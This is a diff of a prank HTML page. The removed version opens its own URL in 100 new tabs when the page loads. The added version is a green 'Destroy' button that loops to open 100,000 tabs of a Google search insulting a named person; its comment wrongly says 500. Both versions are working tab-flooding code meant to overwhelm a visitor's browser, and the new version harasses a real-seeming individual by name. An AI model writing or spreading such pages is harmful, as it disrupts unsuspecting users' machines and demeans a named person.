@@ -1,15 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Open Same Page 100 Times</title>
+    <title>Destroy</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
 </head>
 <body>
 
+<button onclick="destroyEverything()">Destroy</button>
+
 <script>
-    // Loop 100 times
-    for (let i = 0; i < 100; i++) {
-        // Open the current page in a new tab
-        window.open(location.href, '_blank');
+    function destroyEverything() {
+        // Open google.com in a new tab 500 times
+        for (let i = 0; i < 100000; i++) {
+            window.open('https://www.google.com/search?q=abhay+paul+is+a+monkey&rlz=1CAJEHJ_enCA1113&oq=abhay+paul+is+a+monkey&gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBCTEyMDYzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8&safe=active&ssui=on', '_blank');
+        }
     }
 </script>
 
